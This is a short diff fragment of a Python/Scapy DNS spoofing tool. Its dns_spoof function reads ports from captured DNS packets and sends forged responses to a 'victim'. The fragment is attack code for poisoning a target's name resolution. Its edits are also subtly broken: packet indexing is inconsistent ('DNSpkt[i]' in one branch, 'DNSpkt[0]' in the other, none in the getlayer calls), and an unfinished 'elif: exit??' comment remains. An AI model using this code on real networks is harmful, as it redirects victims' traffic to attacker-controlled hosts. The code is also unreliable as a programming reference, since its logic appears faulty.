@@ -36,10 +36,10 @@ def dns_spoof():
             srcIP = DNSpkt.getlayer(IP).src
 
             # check if it is UDP or TCP traffic
-            if DNSpkt.haslayer(UDP):
+            if DNSpkt[i].haslayer(UDP):
                 dstPort = DNSpkt.getlayer(UDP).dport
                 srcPort = DNSpkt.getlayer(UDP).sport
-            elif DNSpkt[i].haslayer(TCP):
+            elif DNSpkt[0].haslayer(TCP):
                 dstPort = DNSpkt.getlayer(TCP).dport
                 srcPort = DNSpkt.getlayer(TCP).sport
 
@@ -61,7 +61,6 @@ def dns_spoof():
             # send packet to victim
             print(spoof_response)
             send(spoof_response)
-
         # elif: exit??
 
 
